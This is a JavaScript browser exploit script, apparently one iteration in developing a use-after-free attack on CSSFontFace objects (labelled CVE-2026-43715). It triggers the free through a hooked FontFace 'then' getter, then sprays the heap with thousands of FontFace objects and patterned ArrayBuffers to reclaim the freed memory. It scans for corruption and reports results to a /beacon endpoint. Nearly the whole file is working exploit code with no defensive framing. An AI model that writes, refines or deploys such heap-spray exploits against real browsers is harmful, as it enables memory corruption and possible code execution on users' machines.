// p456-fontface-uaf-bruteforce.js — CVE-2026-43715 brute-force spray
//
// WHY V455 FAILED: style resolution cannot re-enter during the then getter.
// The 1200 @font-face create/remove cycles were no-ops → dealloc log not flushed.
//
// FIX 1: Use new FontFace() + document.fonts.add() — no style resolution needed.
// FIX 2: Allocate thousands of ABs to exhaust bump regions → force allocator
//         to flush dealloc log and serve from free list.
// FIX 3: Pre-allocate AB fillers, transfer via MessageChannel to synchronously
//         free backing stores → fills dealloc log without CSS subsystem.
//
// UAF WRITE: m_status = Success (3) at m_status offset in freed CSSFontFace
//            PLUS m_timeoutTimer.stop() writes to timer field
(function() {
    var RUN = 'p456-' + Date.now().toString(36);
    function B(tag, body) {
        try {
            var x = new XMLHttpRequest();
            x.open('POST', '/beacon/' + tag + '/' + RUN, false);
            x.send(typeof body === 'object' ? JSON.stringify(body) : (body || ''));
        } catch(e) {}
    }

    B('BOOT', navigator.userAgent);

    // ═══════════════════════════════════════════════════════════════
    // TEST A: FontFace API spray (bypasses style resolution entirely)
    // Spray with 3000 FontFace objects via JS API, not @font-face rules
    // Each creates a CSSFontFace via fastMalloc — same heap as freed target
    // ═══════════════════════════════════════════════════════════════
    try {
        var styleA = document.createElement('style');
        styleA.textContent = "@font-face { font-family: 'p456a'; src: local('Arial'); }";
        document.head.appendChild(styleA);
        document.body.offsetHeight;

        var ruleA = styleA.sheet.cssRules[0];
        var faceA = null;
        var it = document.fonts.values();
        var e;
        while (!(e = it.next()).done) {
            if (e.value.family.replace(/['"]/g, '') === 'p456a') { faceA = e.value; break; }
        }

        if (!faceA) { B('A-DEAD', 'NO-FACE'); }
        else {
            var thenA = 0, aErr = '';
            var sprayFaces = [];

            Object.defineProperty(FontFace.prototype, 'then', { get: function() {
                thenA++;
                if (thenA > 1) return undefined;
                try {
                    // Step 1: Free target CSSFontFace via adopt
                    ruleA.style.setProperty('font-weight', 'bold');
                    document.body.offsetHeight;

                    // Step 2: Spray 3000 FontFaces via JS API (no style resolution)
                    // Each new FontFace() creates a CSSFontFace backing object in fastMalloc
                    // 3000 allocations = ~100 pages = forces allocator to exhaust bump
                    // regions and eventually flush the dealloc log
                    for (var i = 0; i < 3000; i++) {
                        var ff = new FontFace('sp' + i, "local('ZZZZZ_NoSuchFont_" + i + "')");
                        document.fonts.add(ff);
                        sprayFaces.push(ff);
                    }
                } catch(e) { aErr += e.message; }
                return undefined;
            }, configurable: true });

            try { faceA.load(); } catch(e) { aErr += '|load:' + e.message; }
            try { delete FontFace.prototype.then; } catch(e) {}

            B('A-RESULT', {thenFired: thenA, err: aErr, statusAfter: faceA.status});

            // Check for "loaded" status on spray faces (UAF wrote Success=3)
            var aLoaded = [], aTotal = sprayFaces.length;
            for (var i = 0; i < sprayFaces.length; i++) {
                if (sprayFaces[i].status === 'loaded') {
                    aLoaded.push(i);
                }
            }
            B('A-CHECK', {total: aTotal, loaded: aLoaded.length, indices: aLoaded.slice(0, 20)});

            // Also check for "loading" status (in case UAF writes Loading=1 not Success=3)
            var aLoading = [];
            for (var i = 0; i < sprayFaces.length; i++) {
                if (sprayFaces[i].status === 'loading') {
                    aLoading.push(i);
                }
            }
            B('A-LOADING', {count: aLoading.length, indices: aLoading.slice(0, 20)});
        }
    } catch(e) { B('A-ERR', e.message.slice(0,200)); }


    // ═══════════════════════════════════════════════════════════════
    // TEST B: AB spray with MessageChannel transfer for synchronous dealloc log flush
    // Pre-allocate 1200 ABs, transfer them in the getter to free backing stores
    // Then spray with new ABs in CSSFontFace-size range
    // ═══════════════════════════════════════════════════════════════
    try {
        // Pre-allocate filler ABs (various sizes matching CSSFontFace size class candidates)
        var fillerABs = [];
        for (var i = 0; i < 1200; i++) {
            // Alternate between likely size classes
            var sizes = [256, 288, 320, 352, 384];
            fillerABs.push(new ArrayBuffer(sizes[i % sizes.length]));
        }
        var mc = new MessageChannel();

        var styleB = document.createElement('style');
        styleB.textContent = "@font-face { font-family: 'p456b'; src: local('Arial'); }";
        document.head.appendChild(styleB);
        document.body.offsetHeight;

        var ruleB = styleB.sheet.cssRules[0];
        var faceB = null;
        var itB = document.fonts.values();
        var eB;
        while (!(eB = itB.next()).done) {
            if (eB.value.family.replace(/['"]/g, '') === 'p456b') { faceB = eB.value; break; }
        }

        if (!faceB) { B('B-DEAD', 'NO-FACE'); }
        else {
            var thenB = 0, bErr = '';
            var sprayABs = [];

            Object.defineProperty(FontFace.prototype, 'then', { get: function() {
                thenB++;
                if (thenB > 1) return undefined;
                try {
                    // Step 1: Free target CSSFontFace
                    ruleB.style.setProperty('font-weight', 'bold');
                    document.body.offsetHeight;

                    // Step 2: Flush dealloc log by transferring 1200 pre-allocated ABs
                    // Transfer synchronously detaches the AB → backing freed via fastFree
                    for (var i = 0; i < fillerABs.length; i++) {
                        try {
                            mc.port1.postMessage(null, [fillerABs[i]]);
                        } catch(e) {}
                    }

                    // Step 3: Spray with ABs across size class range
                    for (var sz = 224; sz <= 512; sz += 32) {
                        for (var j = 0; j < 200; j++) {
                            var ab = new ArrayBuffer(sz);
                            var dv = new DataView(ab);
                            for (var off = 0; off < sz; off += 4) {
                                dv.setUint32(off, 0x50000000 + off, true);
                            }
                            sprayABs.push({ab: ab, sz: sz});
                        }
                    }
                } catch(e) { bErr += e.message; }
                return undefined;
            }, configurable: true });

            try { faceB.load(); } catch(e) { bErr += '|load:' + e.message; }
            try { delete FontFace.prototype.then; } catch(e) {}

            // Verify fillers were detached
            var detached = 0;
            for (var i = 0; i < fillerABs.length; i++) {
                if (fillerABs[i].byteLength === 0) detached++;
            }
            B('B-RESULT', {thenFired: thenB, err: bErr, detached: detached, statusAfter: faceB.status});

            // Scan spray ABs for corruption
            var hitSizes = [];
            for (var k = 0; k < sprayABs.length; k++) {
                var item = sprayABs[k];
                var dv = new DataView(item.ab);
                for (var off = 0; off < item.sz; off += 4) {
                    var expected = 0x50000000 + off;
                    var actual = dv.getUint32(off, true);
                    if (actual !== expected) {
                        hitSizes.push({
                            idx: k, sz: item.sz, off: off,
                            exp: expected.toString(16),
                            got: actual.toString(16)
                        });
                        break;
                    }
                }
            }
            B('B-SPRAY', {total: sprayABs.length, hits: hitSizes.length, details: hitSizes.slice(0, 20)});
        }
    } catch(e) { B('B-ERR', e.message.slice(0,200)); }


    // ═══════════════════════════════════════════════════════════════
    // TEST C: Combined — FontFace spray after AB transfer flush
    // Best of both: AB transfers for deterministic log flush,
    // FontFace spray for same-type landing
    // ═══════════════════════════════════════════════════════════════
    try {
        var fillerC = [];
        for (var i = 0; i < 1200; i++) {
            fillerC.push(new ArrayBuffer(320));
        }
        var mcC = new MessageChannel();

        var styleC = document.createElement('style');
        styleC.textContent = "@font-face { font-family: 'p456c'; src: local('Arial'); }";
        document.head.appendChild(styleC);
        document.body.offsetHeight;

        var ruleC = styleC.sheet.cssRules[0];
        var faceC = null;
        var itC = document.fonts.values();
        var eC;
        while (!(eC = itC.next()).done) {
            if (eC.value.family.replace(/['"]/g, '') === 'p456c') { faceC = eC.value; break; }
        }

        if (!faceC) { B('C-DEAD', 'NO-FACE'); }
        else {
            var thenC = 0, cErr = '';
            var sprayC = [];

            Object.defineProperty(FontFace.prototype, 'then', { get: function() {
                thenC++;
                if (thenC > 1) return undefined;
                try {
                    ruleC.style.setProperty('font-weight', 'bold');
                    document.body.offsetHeight;

                    // Flush dealloc log via AB transfers
                    for (var i = 0; i < fillerC.length; i++) {
                        try { mcC.port1.postMessage(null, [fillerC[i]]); } catch(e) {}
                    }

                    // Spray 3000 FontFaces (same type as freed CSSFontFace)
                    for (var i = 0; i < 3000; i++) {
                        var ff = new FontFace('sc' + i, "local('ZZZZZ_NoFont_" + i + "')");
                        document.fonts.add(ff);
                        sprayC.push(ff);
                    }
                } catch(e) { cErr += e.message; }
                return undefined;
            }, configurable: true });

            try { faceC.load(); } catch(e) { cErr += '|load:' + e.message; }
            try { delete FontFace.prototype.then; } catch(e) {}

            B('C-RESULT', {thenFired: thenC, err: cErr, statusAfter: faceC.status});

            var cLoaded = [], cLoading = [];
            for (var i = 0; i < sprayC.length; i++) {
                if (sprayC[i].status === 'loaded') cLoaded.push(i);
                else if (sprayC[i].status === 'loading') cLoading.push(i);
            }
            B('C-CHECK', {
                total: sprayC.length,
                loaded: cLoaded.length,
                loading: cLoading.length,
                loadedIdx: cLoaded.slice(0, 20),
                loadingIdx: cLoading.slice(0, 20)
            });
        }
    } catch(e) { B('C-ERR', e.message.slice(0,200)); }


    // ═══════════════════════════════════════════════════════════════
    // TEST D: Diagnostic — does the then getter fire during setStatus(Success)?
    // Check which setStatus call triggers the then getter by monitoring m_status
    // ═══════════════════════════════════════════════════════════════
    try {
        var styleD = document.createElement('style');
        styleD.textContent = "@font-face { font-family: 'p456d'; src: local('Arial'); }";
        document.head.appendChild(styleD);
        document.body.offsetHeight;

        var ruleD = styleD.sheet.cssRules[0];
        var faceD = null;
        var itD = document.fonts.values();
        var eD;
        while (!(eD = itD.next()).done) {
            if (eD.value.family.replace(/['"]/g, '') === 'p456d') { faceD = eD.value; break; }
        }

        if (!faceD) { B('D-DEAD', 'NO-FACE'); }
        else {
            var thenD = 0, dStates = [];

            Object.defineProperty(FontFace.prototype, 'then', { get: function() {
                thenD++;
                dStates.push({
                    call: thenD,
                    faceStatus: faceD.status,
                    fontsStatus: document.fonts.status
                });
                return undefined;
            }, configurable: true });

            try { faceD.load(); } catch(e) {}
            try { delete FontFace.prototype.then; } catch(e) {}

            B('D-DIAGNOSTIC', {
                thenCount: thenD,
                states: dStates,
                finalStatus: faceD.status,
                finalFontsStatus: document.fonts.status
            });
        }
    } catch(e) { B('D-ERR', e.message.slice(0,200)); }

    B('ALIVE', 'all-tests-completed');
    B('DONE', RUN);
})();
